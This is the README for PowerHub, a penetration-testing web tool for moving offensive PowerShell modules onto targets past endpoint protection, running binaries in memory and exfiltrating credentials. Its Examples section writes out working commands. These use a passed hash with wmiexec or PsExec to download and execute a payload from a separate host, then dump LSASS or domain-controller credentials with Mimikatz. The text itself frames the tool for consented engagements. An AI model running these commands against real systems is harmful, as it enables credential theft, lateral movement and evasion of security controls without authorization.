PowerHub
========

PowerHub is a web application which aids a pentester in transferring files,
in particular code which may get flagged by endpoint protection.

![PowerHub Webapp](https://github.com/AdrianVollmer/PowerHub/blob/master/img/powerhub-webapp.png)

During an engagement where you have a test client available, one of the
first things you want to do is run PowerSploit. So you need to download the
files, messing with endpoint protection, disable the execution policy, etc.
PowerHub provides an (almost) one-click-solution for this. Oh, and you can
also run arbitrary binaries (PE and shell code) entirely in-memory using
PowerSploit's modules, which is sometimes useful to bypass application
whitelisting.

Your loot (Kerberos tickets, passwords, etc.) can be easily transferred back
either as a file or a text snippet. PowerHub also helps with collaboration
in case you're a small team.

How it works
============

The web application is made with Flask and consists of three parts.

The Hub
-------

The hub uses PowerShell to load modules and binaries in memory. The binaries
can be executed directly from memory with
[PowerSploit's](https://github.com/PowerShellMafia/PowerSploit)
`Invoke-ReflectivePEInjection`.

Modules have to be placed in `./modules` and can be either PowerShell
scripts, PE executables, or shell code. You can load them on the target via
PowerShell with `Load-HubModule`. Run `Help-PowerHub` for more information.

PowerHub on the attacker system simply looks for `*.ps1` or `*.exe` files.
They need to be in their respective directory, though, so `exe` files need
to be in `modules/exe` (or at least symlinked), and so forth. The `*.ps1`
files are imported on the target via `[Scriptblock]::Create()`.

A simple interface to install modules is provided for your convenience.

The Clipboard
-------------

The clipboard functionality is meant for exchanging small snippets, such as
hashes, passwords, one-liners, and so forth. It's like an extremely basic
[Etherpad](https://etherpad.org/) or a guest book, but non-persistent.

The File Exchange
-----------------

The file exchange offers a way to transfer files via HTTP back to the host.
Think [Droopy](https://github.com/stackp/Droopy).

Usage
=====

PowerHub has two mandatory arguments: the first is the callback host (can be
an IP address) and the second is either `--auth <user>:<pass>` or
`--no-auth`. The latter disables basic authentication which is *not
recommended*. This host name is used by the stager to download the payload.
If the callback port or path differ from the default, it can also be
changed.

Read `./powerhub.py --help` for details.

Examples
========

One nice application is, for example, the case where you have obtained some
local administrator password hash and want to move laterally. This dumps the
LSASS creds with Mimikatz via Impacket's `wmiexec.py`, tricking many
endpoint protection tools:

```
wmiexec.py -hashes :deadbeef0000000000000000deadbeef \
    ./administrator@10.0.1.4  \
    'powershell -c "$K=new-object net.webclient;IEX $K.downloadstring(\"http://10.0.100.13:8000/0\"); Load-Hubmodule Mimikatz ; Invoke-Mimikatz -DumpCreds "'
```

Or similarly, if you obtained the `krbtgt` hash and created a golden ticket
which you injected with Mimikatz. Then you can get the NTLM hash of any
arbitrary user in the forest:

```
PS C:\Users\pentestuser> .\PsExec64.exe \\DC01.acme.local -s powershell -c '$K=new-object net.webclient;IEX $K.downloadstring(\"http://192.168.1.5:8000/0\");load-hubmodule mimikatz; Invoke-Mimikatz -Command ''\"lsadump::lsa /inject /name:adm_targetuser\"'''
```

Getting the escape sequence on the quotes right can be tough...

Author
======

Adrian Vollmer, 2018-2019

Disclaimer
==========

Use at your own risk. Do not use without full consent of everyone involved.
For educational purposes only.
